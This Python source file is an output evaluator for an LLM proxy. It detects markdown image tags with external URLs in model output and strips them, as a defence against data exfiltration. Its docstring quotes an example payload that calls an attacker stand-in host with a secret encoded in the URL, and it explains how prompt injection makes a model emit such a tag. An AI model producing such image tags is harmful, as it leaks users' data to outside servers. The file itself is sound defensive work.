"""Exfiltration evaluator — detects markdown image tags pointing at external
URLs in LLM output, and (by default) strips them before the response reaches
the client.

A markdown image tag `![alt](https://attacker.example.com/log?data=SECRET)`
is a known data-exfiltration technique: a client that eagerly renders
markdown — many chat UIs do — auto-fetches the image URL the moment it
renders the response, leaking whatever's encoded in the URL to an
attacker-controlled server before a human ever reads the reply. The
injected instruction that produces this lives upstream, in the user's
input, but by the time it's actually dangerous it's in the model's OWN
output — an input classifier can't catch it there, and an LLM's own
alignment refusing the request is not something this proxy controls or can
rely on. This is deliberately a plain regex check, not a model: the goal is
a deterministic guarantee, not a probabilistic one.

Score: 1.0 if any markdown image with an http(s) URL is found (0.0
otherwise) — no partial credit, since even one is the full exploit.
flag_direction = 'above': flag when found.

`data:` URIs are left untouched — the image data is embedded inline, so
there's nothing to fetch and nothing to leak.

Config keys (under evaluators.exfiltration in config.yaml):
    threshold (float):      Effectively binary (0.0 or 1.0) — default 0.5 works.
    action (str):            'strip' | 'flag'. Default 'strip'. 'flag' scores
                             and logs but leaves the response untouched, for
                             environments that want visibility before
                             enabling the stripping behavior.
    allowed_domains (list):  Hostnames exempt from stripping (e.g. your own
                             CDN). Default empty — every external image URL
                             is stripped.

Only protects the non-streaming response path. A streamed response is sent
to the client incrementally as it's generated — by the time this evaluator
sees the accumulated text, the image tag has already been streamed out.
This is the same fundamental limitation every output evaluator has for
streaming (toxicity, hallucination, etc. are also post-hoc/logging-only
there) — not a gap specific to this one.
"""

from __future__ import annotations

import re
from urllib.parse import urlparse

from sentinel.evaluators.base import BaseEvaluator, EvalPayload

# Matches markdown image syntax: ![alt text](url "optional title")
_MARKDOWN_IMAGE_RE = re.compile(r'!\[([^\]]*)\]\(([^)\s]+)(?:\s+"[^"]*")?\)')


class ExfiltrationEvaluator(BaseEvaluator):
    """Detects and strips markdown image tags with external URLs from LLM output."""

    name = "exfiltration"
    runs_on = "output"
    flag_direction = "above"

    def _load_model(self) -> None:
        # Plain regex check — nothing to load. Method required by BaseEvaluator.
        self._model = _MARKDOWN_IMAGE_RE

    async def _run_inference(self, payload: EvalPayload) -> tuple[float, dict | None]:
        text = payload.output_text
        assert text is not None  # guaranteed by BaseEvaluator.evaluate() for output evaluators
        action: str = self.config.get("action", "strip")
        allowed_domains: set[str] = set(self.config.get("allowed_domains", []) or [])

        matches = []
        for m in _MARKDOWN_IMAGE_RE.finditer(text):
            url = m.group(2)
            parsed = urlparse(url)
            if parsed.scheme not in ("http", "https"):
                continue  # data: URIs, relative paths — nothing external to fetch
            if parsed.hostname in allowed_domains:
                continue
            matches.append({"alt": m.group(1), "url": url, "host": parsed.hostname})

        if not matches:
            return 0.0, {"matches": [], "action": action}

        metadata: dict = {"matches": matches, "action": action}

        if action == "strip":

            def _replace(m: re.Match) -> str:
                url = m.group(2)
                parsed = urlparse(url)
                if parsed.scheme in ("http", "https") and parsed.hostname not in allowed_domains:
                    return "[image removed by SentinelLM — external URL blocked]"
                return m.group(0)

            metadata["stripped_text"] = _MARKDOWN_IMAGE_RE.sub(_replace, text)

        return 1.0, metadata
